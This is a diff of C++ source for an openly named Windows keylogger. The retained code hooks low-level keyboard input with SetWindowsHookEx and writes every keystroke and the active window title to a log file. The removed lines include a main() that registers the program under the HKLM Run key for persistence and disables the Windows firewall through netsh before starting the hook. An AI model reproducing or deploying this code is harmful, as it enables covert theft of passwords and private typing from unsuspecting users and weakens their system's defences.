@@ -1,8 +1,6 @@
-﻿// SetWindowsHookEx-Keylogger.cpp : Defines the entry point for the console application.
-//
+#pragma once
 
-#include "pch.h"
-#include "RegistryKey.h"
+#include <Windows.h>
 #include "time.h"
 #include "string"
 #include <sstream>
@@ -20,31 +18,19 @@ char cWindow[1000];
 // NULL is ok
 HWND lastWindow = NULL;
 // File Path
-std::string fileName = "C:\\Users\\mor0146\\source\\repos\\Keylogger\\Keylogger\\output\\log.txt";
+std::string fileName = "C:\\Users\\mor0146\\Documents\\Keylog.log";
 
-// All hooks must be unhooked!
-void unhookKeyboard()
+void unhook_keyboard()
 {
 	UnhookWindowsHookEx(KeyboardHook);
 	exit(0);
 }
 
-std::string HookCode(DWORD code, BOOL caps, BOOL shift)
+std::string translate_hook_code(DWORD code, BOOL caps, BOOL shift)
 {
-	/*
-	Translate the return code from hook and
-	return the std::string rep of the the code.
-	ex. 0x88 -> "[SHIFT]"
-	caps = Caps lock on
-	shift = Shift key pressed
-	WinUser.h = define statments
-	LINK = https://msdn.microsoft.com/en-us/library/dd375731(v=VS.85).aspx
-	*/
 	std::string key;
 	switch (code) // SWITCH ON INT
 	{
-		// Char keys for ASCI
-		// No VM Def in header
 	case 0x41:
 		key = caps ? (shift ? "a" : "A") : (shift ? "A" : "a");
 		break;
@@ -432,72 +418,20 @@ std::string HookCode(DWORD code, BOOL caps, BOOL shift)
 	return key;
 }
 
-std::string Dayofweek(int code)
-{
-	// Return Day of the year in text
-	std::string name;
-	switch (code)
-	{
-	case 0:
-		name = "[SUNDAY]";
-		break;
-	case 1:
-		name = "[MONDAY]";
-		break;
-	case 2:
-		name = "[TUESDAY]";
-		break;
-	case 3:
-		name = "[WENSDAY]";
-		break;
-	case 4:
-		name = "[THURSDAY]";
-		break;
-	case 5:
-		name = "[FRIDAY]";
-		break;
-	case 6:
-		name = "[SATURDAY]";
-		break;
-	default:
-		name = "[UNKOWN]";
-	}
-	return name;
-}
 
-LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
+
+LRESULT CALLBACK keyboard_hook_callback(int nCode, WPARAM wParam, LPARAM lParam)
 {
-	/*
-	SHORT WINAPI GetKeyState(
-		_In_ int nVirtKeydasdsad
-		);
-	*/
-	std::ofstream myfile(fileName, std::ios::out | std::ios::app);
-	assert(myfile.is_open());
+	std::ofstream logFile(fileName, std::ios::out | std::ios::app);
 
 	bool caps = FALSE;
 	SHORT capsShort = GetKeyState(VK_CAPITAL);
 	std::string outPut;
-	std::stringstream temp;
 	if (capsShort > 0)
 	{
 		// If the high-order bit is 1, the key is down; otherwise, it is up
 		caps = TRUE;
 	}
-	/*
-	WH_KEYBOARD_LL uses the LowLevelKeyboardProc Call Back
-	LINK = https://msdn.microsoft.com/en-us/library/windows/desktop/ms644985(v=vs.85).aspx
-	*/
-	// LowLevelKeyboardProc Structure
-	/*
-	typedef struct tagKBDLLHOOKSTRUCT {
-		DWORD     vkCode;
-		DWORD     scanCode;
-		DWORD     flags;
-		DWORD     time;
-		ULONG_PTR dwExtraInfo;
-		} KBDLLHOOKSTRUCT, *PKBDLLHOOKSTRUCT, *LPKBDLLHOOKSTRUCT;
-	*/
 	KBDLLHOOKSTRUCT *p = (KBDLLHOOKSTRUCT *)lParam;
 	// Do the wParam and lParam parameters contain information about a keyboard message.
 	if (nCode == HC_ACTION)
@@ -528,55 +462,9 @@ LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 			// Check if we need to write new window output
 			if (currentWindow != lastWindow)
 			{
-				/*
-				void WINAPI GetLocalTime(
-					  _Out_ LPSYSTEMTIME lpSystemTime
-					);
-				typedef struct _SYSTEMTIME {
-					WORD wYear;
-					WORD wMonth;
-					WORD wDayOfWeek;
-					WORD wDay;
-					WORD wHour;
-					WORD wMinute;
-					WORD wSecond;
-					WORD wMilliseconds;
-					} SYSTEMTIME, *PSYSTEMTIME;
-				*/
-				//LPSYSTEMTIME t;
-
-#if 0
-				SYSTEMTIME t;
-				GetLocalTime(&t);
-				int day = t.wDay;
-				int month = t.wMonth;
-				int year = t.wYear;
-				int hour = t.wHour;
-				int min = t.wMinute;
-				int sec = t.wSecond;
-				int dayName = t.wDayOfWeek;
-				// Build our output header
-				temp << "\\n\\n[+] " << Dayofweek(dayName) << " - " << day << "/" << month << "/" << year << "  ";
-				temp << hour << ":" << min << ":" << sec;
-				outPut.append(temp.str());
-				temp.clear();
-#endif // 0
-
-				/*
-				int WINAPI GetWindowText(
-				  _In_  HWND   hWnd,
-				  _Out_ LPTSTR lpString,
-				  _In_  int    nMaxCount
-				);
-				*/
 
 				int c = GetWindowTextA(GetForegroundWindow(), cWindow, sizeof(cWindow));
-				std::cout << c;
-				temp << " - Current Window: " << cWindow << std::endl;
-				myfile << "Current window: " << cWindow << std::endl;
-
-				std::cout << std::endl
-					<< temp.str() << std::endl;
+				logFile << "Current window: " << cWindow << std::endl;
 
 				// Setup for next CallBack
 				lastWindow = currentWindow;
@@ -585,100 +473,13 @@ LRESULT CALLBACK HookProcedure(int nCode, WPARAM wParam, LPARAM lParam)
 			if (p->vkCode)
 			{
 				//outPut.append(HookCode(p->vkCode, caps, shift));
-				temp.clear();
-				temp << HookCode(p->vkCode, caps, shift);
-				std::cout << temp.str();
-				myfile << temp.str();
+				logFile << translate_hook_code(p->vkCode, caps, shift);
 			}
 			// Final output logic
 		}
 	}
-	// hook procedure must pass the message *Always*
-	myfile.close();
+	logFile.close();
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-// rlm stands for registry_local_machine
-//constexpr char RegistryKeyName[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Keylogger\0";
 
-static std::string get_current_exe_path()
-{
-	char path[255];
-	DWORD pathLen = GetModuleFileNameA(NULL, path, 255);
-	std::string pth(path, path + pathLen);
-	pth += '\0';
-	return pth;
-}
-
-void registry_stuff()
-{
-	const char* valueName = "Keylogger";
-	std::string exePath = get_current_exe_path();
-	RegistryKey::create_if_not_exist(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
-
-	try
-	{
-		std::string value = RegistryKey::query_string_value(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", valueName);
-		if (value != exePath)
-		{
-			RegistryKey::set_string_value(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", valueName, exePath.data());
-		}
-	}
-	catch (const std::runtime_error&)
-	{
-		// Value doesn't exist.
-		RegistryKey::set_string_value(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", valueName, exePath.data());
-	}
-}
-
-void firewall_control(bool firewallEnabled)
-{
-	const char* enableCmd = "netsh firewall set opmode enable";
-	const char* disableCmd = "netsh firewall set opmode disable";
-	system(firewallEnabled ? enableCmd : disableCmd);
-}
-
-int main()
-{
-	std::ofstream log("C:\\Users\\mor0146\\Documents\\klgr.log", std::ios::out);
-	log << "keylogger start." <<  std::endl;
-	registry_stuff();
-	firewall_control(false);
-	log << "keylogger end." << std::endl;
-	return 0;
-	std::cout << "[*] Starting KeyCapture" << std::endl;
-	/*
-	HHOOK WINAPI SetWindowsHookEx(
-	  _In_ int       idHook,
-	  _In_ HOOKPROC  lpfn,
-	  _In_ HINSTANCE hMod,
-	  _In_ DWORD     dwThreadId
-	);
-	*/
-	// Start the hook of the keyboard
-	KeyboardHook = SetWindowsHookEx(
-		WH_KEYBOARD_LL,		   // low-level keyboard input events
-		HookProcedure,		   // pointer to the hook procedure
-		GetModuleHandle(NULL), // A handle to the DLL containing the hook procedure
-		NULL				   //desktop apps, if this parameter is zero
-	);
-	if (!KeyboardHook)
-	{
-		// Hook returned NULL and failed
-		std::cout << "[!] Failed to get handle from SetWindowsHookEx()" << std::endl;
-	}
-	else
-	{
-		std::cout << "[*] KeyCapture handle ready" << std::endl;
-		// http://www.winprog.org/tutorial/message_loop.html
-		MSG Msg;
-		while (GetMessage(&Msg, NULL, 0, 0) > 0)
-		{
-			TranslateMessage(&Msg);
-			DispatchMessage(&Msg);
-		}
-	}
-	unhookKeyboard();
-	// Exit if failure
-	return 0;
-}
